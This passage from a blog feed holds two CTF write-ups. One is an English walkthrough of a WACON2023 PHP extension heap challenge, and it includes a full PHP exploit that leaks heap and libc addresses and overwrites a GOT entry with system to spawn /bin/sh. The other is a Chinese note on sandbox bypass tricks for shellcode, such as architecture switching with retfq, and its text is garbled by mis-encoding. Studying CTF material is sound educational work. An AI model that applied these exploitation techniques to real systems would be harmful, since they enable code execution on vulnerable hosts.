class="comment">/* long value */</span></span><br><span class="line"><span class="type">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="type">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> w1;</span><br><span class="line"><span class="type">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> type_info;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u)</span><br><span class="line">&#125; v;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line"><span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line"><span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>That`s quite a complex structure, if we replace the meaningless <code>__int64 xx</code> with corresponding zend data type, then it will be easier to comprehend.</p><p>by the way, the form of parameters looks weird</p><p><img src="/../img/php-pwn.assets/image-20230914225045011.png" alt="image-20230914225045011"></p><p>It doesn`t mean takeing exactly 2 parameters. In fact,  <code>a1</code> stands for the input args (parsed by something like <code>zend_parse_arg</code>), while <code>a2</code> stands for the return values. We may set type of <code>a1</code> to be <code>zend_execute_data *</code> and <code>a2</code> to be <code>zval *</code>. In practice, I set <code>a1</code> to be <code>_zval_struct *</code> for better comprehension.</p><p>After checking the declaration, the meaning of following parts a clear. (take <code>zif_add_note</code> for example)</p><p><img src="/../img/php-pwn.assets/image-20230915121612049.png" alt="image-20230915121612049"></p><p><code>v2</code> represents the total number of parameters, and here should be 2.</p><p><img src="/../img/php-pwn.assets/image-20230915121952724.png" alt="image-20230915121952724"></p><p>Here comes a type check. Refering the table and we find ‚Äò6‚Äô represents string. So arg1 should be a string ptr, and will be copied to <code>v4</code>.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><code>zif_add_note</code> use <code>strlen</code> to caculate the length of input string and allocate corresponding memory. However, when using <code>memcpy</code> to copy content, the 3rd argument taken is the actual length of string. The consequences is that string can be cut off by NULL, which means we can overwrite the next memory`s fd.</p><p><code>zif_add_note</code> also contains an off by NULL Vulnerability.But who cares?</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Since Partial RELRO is on, we can overwrite GOT table. Before that, we must leak the address of heap.so and libc.so.</p><h3 id="Debuging-Tricks"><a href="#Debuging-Tricks" class="headerlink" title="Debuging Tricks"></a>Debuging Tricks</h3><p>To load the target extension, you should put the extension in correct path. To find the path, run</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">php -i | grep -i extension_dir</span></span><br></pre></td></tr></table></figure><p>And modify the php.ini file. You can <code>find</code> it in root directory.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find / -name <span class="string">&quot;php.ini&quot;</span></span></span><br></pre></td></tr></table></figure><p>Add the config at the file end</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=heaphp.so</span><br></pre></td></tr></table></figure><p>After that, you can check if it`s properly loaded by <code>phpinfo</code> or checking the <code>/proc/[pid]/maps</code> when running php.</p><p>To debug the extension, we run php with gdb attached first</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gdb php</span></span><br></pre></td></tr></table></figure><p>Then we <code>run</code> it and press <code>Ctrl+c</code> to interrupt it. Check the <code>vmmap</code> , you may find heaphp.so is loaded.</p><p>We can set breakpoints now. Don&#96;t forget to set our exploit script as argument.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">set</span> args ./exp.php</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">b zif_add_notes</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure><p>You can also write them in a gdb script.</p><h2 id="Address-Leak"><a href="#Address-Leak" class="headerlink" title="Address Leak"></a>Address Leak</h2><p>Through overwrite the content pointer of any notes, we may get content of arbitrary address through <code>zif_view_note</code>.</p><p>First step, we can leak an fd pointer (by <code>zif_view_note</code> or <code>zif_list_note</code> ). Our heap memory was allocated by mmap anonymously, it doesn&#96;t have a constant offset with libc.so or heaphp.so.</p><p><img src="/../img/php-pwn.assets/image-20230915150945514.png" alt="image-20230915150945514"></p><p>However, we may find a pointer related to libc.so or heaphp.so on the heap. It could be extremely hard to find one through analyzing the source code. But I found a useful tool in pwndbg.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usage: leakfind [-h] [-p [PAGE_NAME]] [-o [MAX_OFFSET]] [-d [MAX_DEPTH]] [-s [STEP]] [--negative_offset [NEGATIVE_OFFSET]] address</span><br></pre></td></tr></table></figure><p><code>leakfind</code> is a powerful tool to leak address given a starting address, then we can find some libc pointers on the heap.</p><p><img src="/../img/php-pwn.assets/image-20230915151632552.png" alt="image-20230915151632552"></p><p>On obtaining the libc address, we get heaphp.so address since they have constant offset, then we can overwrite the <code>_efree@got.plt</code> on the heaphp.so with the actual address of <code>system</code>  on libc.so.</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>It`s not the final edition because functions like <code>chr()</code> are banned in the docker, and getting shell is usually not allowed in PHP pwn. I preserved them to make it more readable.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// function mychr($index)&#123;</span></span><br><span class="line"><span class="comment">// return [&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;, &#x27;\x7f&#x27;, &#x27;\x80&#x27;, &#x27;\x81&#x27;, &#x27;\x82&#x27;, &#x27;\x83&#x27;, &#x27;\x84&#x27;, &#x27;\x85&#x27;, &#x27;\x86&#x27;, &#x27;\x87&#x27;, &#x27;\x88&#x27;, &#x27;\x89&#x27;, &#x27;\x8a&#x27;, &#x27;\x8b&#x27;, &#x27;\x8c&#x27;, &#x27;\x8d&#x27;, &#x27;\x8e&#x27;, &#x27;\x8f&#x27;, &#x27;\x90&#x27;, &#x27;\x91&#x27;, &#x27;\x92&#x27;, &#x27;\x93&#x27;, &#x27;\x94&#x27;, &#x27;\x95&#x27;, &#x27;\x96&#x27;, &#x27;\x97&#x27;, &#x27;\x98&#x27;, &#x27;\x99&#x27;, &#x27;\x9a&#x27;, &#x27;\x9b&#x27;, &#x27;\x9c&#x27;, &#x27;\x9d&#x27;, &#x27;\x9e&#x27;, &#x27;\x9f&#x27;, &#x27;\xa0&#x27;, &#x27;¬°&#x27;, &#x27;¬¢&#x27;, &#x27;¬£&#x27;, &#x27;¬§&#x27;, &#x27;¬•&#x27;, &#x27;¬¶&#x27;, &#x27;¬ß&#x27;, &#x27;¬®&#x27;, &#x27;¬©&#x27;, &#x27;¬™&#x27;, &#x27;¬´&#x27;, &#x27;¬¨&#x27;, &#x27;\xad&#x27;, &#x27;¬Æ&#x27;, &#x27;¬Ø&#x27;, &#x27;¬∞&#x27;, &#x27;¬±&#x27;, &#x27;¬≤&#x27;, &#x27;¬≥&#x27;, &#x27;¬¥&#x27;, &#x27;¬µ&#x27;, &#x27;¬∂&#x27;, &#x27;¬∑&#x27;, &#x27;¬∏&#x27;, &#x27;¬π&#x27;, &#x27;¬∫&#x27;, &#x27;¬ª&#x27;, &#x27;¬º&#x27;, &#x27;¬Ω&#x27;, &#x27;¬æ&#x27;, &#x27;¬ø&#x27;, &#x27;√Ä&#x27;, &#x27;√Å&#x27;, &#x27;√Ç&#x27;, &#x27;√É&#x27;, &#x27;√Ñ&#x27;, &#x27;√Ö&#x27;, &#x27;√Ü&#x27;, &#x27;√á&#x27;, &#x27;√à&#x27;, &#x27;√â&#x27;, &#x27;√ä&#x27;, &#x27;√ã&#x27;, &#x27;√å&#x27;, &#x27;√ç&#x27;, &#x27;√é&#x27;, &#x27;√è&#x27;, &#x27;√ê&#x27;, &#x27;√ë&#x27;, &#x27;√í&#x27;, &#x27;√ì&#x27;, &#x27;√î&#x27;, &#x27;√ï&#x27;, &#x27;√ñ&#x27;, &#x27;√ó&#x27;, &#x27;√ò&#x27;, &#x27;√ô&#x27;, &#x27;√ö&#x27;, &#x27;√õ&#x27;, &#x27;√ú&#x27;, &#x27;√ù&#x27;, &#x27;√û&#x27;, &#x27;√ü&#x27;, &#x27;√†&#x27;, &#x27;√°&#x27;, &#x27;√¢&#x27;, &#x27;√£&#x27;, &#x27;√§&#x27;, &#x27;√•&#x27;, &#x27;√¶&#x27;, &#x27;√ß&#x27;, &#x27;√®&#x27;, &#x27;√©&#x27;, &#x27;√™&#x27;, &#x27;√´&#x27;, &#x27;√¨&#x27;, &#x27;√≠&#x27;, &#x27;√Æ&#x27;, &#x27;√Ø&#x27;, &#x27;√∞&#x27;, &#x27;√±&#x27;, &#x27;√≤&#x27;, &#x27;√≥&#x27;, &#x27;√¥&#x27;, &#x27;√µ&#x27;, &#x27;√∂&#x27;, &#x27;√∑&#x27;, &#x27;√∏&#x27;, &#x27;√π&#x27;, &#x27;√∫&#x27;, &#x27;√ª&#x27;, &#x27;√º&#x27;, &#x27;√Ω&#x27;, &#x27;√æ&#x27;, &#x27;√ø&#x27;][$index];</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tobytes</span>(<span class="params"><span class="variable">$integerValue</span>, <span class="variable">$byteLength</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$byteString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$byteLength</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byteString</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$integerValue</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        <span class="variable">$integerValue</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$byteString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number1&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00/bin/shacaaadaaaeaaafaaagaaahaaaiaaajaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fd</span>=<span class="title function_ invoke__">list_note</span>();</span><br><span class="line"><span class="variable">$fd</span> = <span class="variable">$fd</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$decimalValue</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">6</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$fd</span>[-<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$decimalValue</span> = (<span class="variable">$decimalValue</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="variable">$decimalValue</span> - <span class="number">0x1480</span>;</span><br><span class="line"><span class="variable">$target_libc</span> = <span class="variable">$heap_base</span> + <span class="number">0x82000</span>; </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$target_libc</span>,<span class="number">8</span>));</span><br><span class="line"><span class="variable">$libc_off</span> = <span class="title function_ invoke__">view_note</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$libc</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">5</span>; <span class="variable">$i</span> &gt;= <span class="number">0</span>; <span class="variable">$i</span>--) &#123;</span><br><span class="line">    <span class="variable">$char</span> = <span class="variable">$libc_off</span>[<span class="variable">$i</span>];</span><br><span class="line">    <span class="variable">$digit</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>);</span><br><span class="line">    <span class="variable">$libc</span> = (<span class="variable">$libc</span> &lt;&lt; <span class="number">8</span>) | <span class="variable">$digit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$libc</span> -= <span class="number">0x219aa0</span>;</span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&quot;%x&quot;</span>,<span class="variable">$libc</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$heaphp_base</span> = <span class="variable">$libc</span> + <span class="number">0x7af000</span>;</span><br><span class="line"><span class="variable">$sys_addr</span> = <span class="variable">$libc</span> + <span class="number">0x50d60</span>;</span><br><span class="line"><span class="variable">$efree_got_addr</span> = <span class="variable">$heaphp_base</span> + <span class="number">0x4058</span>;</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;number0&quot;</span>,<span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa\x00aaaabaaacaaadaaaeaaafaaagaaahaaa\xff\x00\x00\x00\x00\x00\x00\x00&quot;</span> . <span class="title function_ invoke__">tobytes</span>(<span class="variable">$efree_got_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">add_note</span>(<span class="string">&quot;./readflag&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">edit_note</span>(<span class="number">1</span>,<span class="title function_ invoke__">tobytes</span>(<span class="variable">$sys_addr</span>,<span class="number">8</span>));</span><br><span class="line"><span class="title function_ invoke__">delete_note</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;It&amp;#96;s my first time encountering this fancy pwn item, known as Web Pwn, on WACON2023. I have few experience on php coding, so it spent</summary>
      
    
    
    
    <category term="CS" scheme="http://deepunk.icu/categories/CS/"/>
    
    
    <category term="PWN" scheme="http://deepunk.icu/tags/PWN/"/>
    
    <category term="CTF" scheme="http://deepunk.icu/tags/CTF/"/>
    
    <category term="wp" scheme="http://deepunk.icu/tags/wp/"/>
    
    <category term="PHP" scheme="http://deepunk.icu/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Tricks of Shellcode</title>
    <link href="http://deepunk.icu/Tricks-of-Shellcode/"/>
    <id>http://deepunk.icu/Tricks-of-Shellcode/</id>
    <published>2023-08-29T13:56:08.000Z</published>
    <updated>2023-12-09T07:11:23.568Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ÊúÄËøëÊâì‰∫ÜÊå∫Â§öÊØîËµõÔºåÁ¢∞Âà∞‰∏Ä‰∫õÊØîËæÉÊúâÊÑèÊÄùÁöÑÈ¢òÂíåÊñπÊ≥ï</p></blockquote><p>shellcodeÁöÑÈ¢òÊå∫Â§öÔºåÂæÄÂæÄÈÉΩÊòØÂä†‰∫Ü‰∏Ä‰∫õ‰π±‰∏ÉÂÖ´Á≥üÁöÑÈôêÂà∂„ÄÇ‰∏ÄËà¨Ë¶Å‰πàÈôêÂà∂Â≠óÁ¨¶ÔºåË¶Å‰πàÂºÄÊ≤ôÁÆ±„ÄÇÈôêÂà∂Â≠óÁ¨¶Âü∫Êú¨‰∏äÂ∞±ÈÄöËøáÊâãÊêì<del>Êàë‰∏ç‰ºö</del>ÊàñËÄÖalpha3‰πãÁ±ªÁöÑÂ∑•ÂÖ∑ÂÆûÁé∞ÔºåËøôÈáåËÆ≤‰∏Ä‰∫õÁªïËøáÊ≤ôÁÆ±ÁöÑÂäûÊ≥ï„ÄÇ</p><h1 id="ÂàáÊç¢Êû∂ÊûÑ"><a href="#ÂàáÊç¢Êû∂ÊûÑ" class="headerlink" title="ÂàáÊç¢Êû∂ÊûÑ"></a>ÂàáÊç¢Êû∂ÊûÑ</h1><p>È¢òÁõÆ‰∏ç‰ªÖÁ¶ÅÊ≠¢getshellÔºåÁîöËá≥ÈôêÂà∂‰∫ÜorwÔºåÂ¶ÇÊûúÊ≤ôÁÆ±Ê≤°ÊúâÂØπÁ≥ªÁªüÊû∂ÊûÑËøõË°åÊ£ÄÊü•ÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî®ÂàáÊç¢Êû∂ÊûÑÁöÑÊñπÂºè„ÄÇ</p><p>ÂéüÁêÜÊòØÊ≤ôÁÆ±ÈÄöËøáÊ£ÄÊµãÁ≥ªÁªüË∞ÉÁî®Âè∑Âà§Êñ≠ÊòØÂê¶ÊîæË°åÔºåËÄå64‰ΩçÂíå32‰ΩçÊû∂ÊûÑ‰∏ãÁöÑÁ≥ªÁªüË∞ÉÁî®Âè∑Âèà‰∏çÁõ∏ÂêåÔºåÂàáÊç¢Âà∞Âè¶‰∏ÄÁßçÊû∂ÊûÑÔºåÂ∞±ËÉΩÂÆûÁé∞ÁªïËøáÈªëÂêçÂçïÊ£ÄÊü•</p><p>ËøôÁßçÊâãÊ≥ïÂê¨Ëµ∑Êù•ÂæàÁÇ´ÈÖ∑ÔºåÊìç‰ΩúÂç¥Áõ∏ÂΩìÁÆÄÂçï</p><p>Á®ãÂ∫èËøêË°åÊó∂ÁöÑÊû∂ÊûÑÔºåÊòØÁî±<code>cs</code>ÂØÑÂ≠òÂô®ÊéßÂà∂ÁöÑ„ÄÇ<code>cs=0x23</code>‰∏∫32‰ΩçÊ®°ÂºèÔºå<code>cs=0x33</code>‰∏∫64‰ΩçÊ®°Âºè„ÄÇËÄå<code>retfq</code>Êåá‰ª§Â∞±ËÉΩÂÆûÁé∞ÂØπ<code>cs</code>ÁöÑËµãÂÄº</p><p><code>retfq</code>ÂåÖÂê´<code>ret</code>Âíå<code>pop cs</code>‰∏§Ê≠•Ôºå‰πüÂ∞±ÊòØÂÖàÂêépop <code>rip</code>Âíå<code>cs</code>ÔºåÊâÄ‰ª•‰∏ÄËà¨ÂèØ‰ª•ÂÉèËøôÊ†∑ÂÜôÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, 0x40404040 #arbitrary stack</span><br><span class="line">push 0x23 #or 0x33</span><br><span class="line">push 0x401145 #next shellcode</span><br><span class="line">retfq</span><br></pre></td></tr></table></figure><p>Ê≥®ÊÑèËøôÈáåÈúÄË¶ÅËÆæÁΩÆ<code>rsp</code>ÔºåËøôÊòØÂõ†‰∏∫ÂàáÊç¢Âà∞32‰ΩçÊó∂ÔºåÂØÑÂ≠òÂô®‰πü‰ºöË¢´ÂàáÊàê32‰ΩçÔºåÊâÄ‰ª•ÈúÄË¶ÅÈ¢ÑÂÖàË∞ÉÊï¥Ê†àÈ°∂ÁöÑÊåáÈíà</p><p>Âè¶Â§ñÊàëÂú®Êìç‰ΩúÊó∂ÂèëÁé∞<code>ret</code>ÂêéÁöÑÂú∞ÂùÄ‰ºº‰πéÊúâ‰∏ÄÂÆöË¶ÅÊ±Ç„ÄÇËµ∑ÂàùÊàëÁõ¥Êé•Ë∑≥Âà∞‰∏ã‰∏ÄÊù°shellcode‰∏äÔºå‰ΩÜ‰ºöÂú®retfqÊó∂Â¥©Ê∫ÉÔºåÂêéÊù•Êàë<code>ret</code>Âà∞‰ª£Á†ÅÊÆµÈáåË∞ÉÁî®shellcodeÁöÑÂú∞ÂùÄÔºåÂÜçÊèêÂâçËÆæÁΩÆÂ•ΩÂØÑÂ≠òÂô®ÔºåÈ°∫Âà©Ëß£ÂÜ≥‰∫ÜËøô‰∏™ÈóÆÈ¢ò</p><h1 id="ËÄÖË°åÂ≠ô"><a href="#ËÄÖË°åÂ≠ô" class="headerlink" title="ËÄÖË°åÂ≠ô"></a>ËÄÖË°åÂ≠ô</h1><p><del>‰Ω†Â∞±ËØ¥ÊòØ‰∏çÊòØ‰∏Ä‰∏™‰∏úË•øÂêß</del></p><p>Ê≤°ÊúâopenÁöÑÂèØ‰ª•Áî®openat‰ª£Êõø</p><p>Ê≤°ÊúâreadÁöÑÂèØ‰ª•Áî®pread64&#x2F;writev‰ª£Êõø</p><p><a href="https://evian-zhang.github.io/introduction-to-linux-x86_64-syscall/src/filesystem/read-pread64-readv-preadv-preadv2.html">read, pread64, readv, preadv, preadv2Á≥ªÁªüË∞ÉÁî®</a></p><p>Ëøô‰πàÁé©Â∞±Ê≤°ÊÑèÊÄù‰∫Ü</p><h1 id="‰ΩøÁî®socket"><a href="#‰ΩøÁî®socket" class="headerlink" title="‰ΩøÁî®socket"></a>‰ΩøÁî®socket</h1><p>ÊúâÁ©∫ÁúãÁúã</p><p><a href="http://blog.eonew.cn/2019-06-03.%E5%8F%8D%E5%90%91shellcode.html">EXÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢</a></p><h1 id="Áõ≤Ê≥®"><a href="#Áõ≤Ê≥®" class="headerlink" title="Áõ≤Ê≥®"></a>Áõ≤Ê≥®</h1><p>Êå∫ÊúâË∂£ÁöÑÂÅöÊ≥ïÔºåÊâæÊó∂Èó¥ÂÜçËØ¶ÁªÜÁ†îÁ©∂‰∏ã</p><p><a href="https://m1ku.in/archives/737">m1kuÂ§ß‰Ω¨ÁöÑÂçöÂÆ¢</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;ÊúÄËøëÊâì‰∫ÜÊå∫Â§öÊØîËµõÔºåÁ¢∞Âà∞‰∏Ä‰∫õÊØîËæÉÊúâÊÑèÊÄùÁöÑÈ¢òÂíåÊñπÊ≥ï&lt;/p&gt;
&lt;/blockquote&gt;
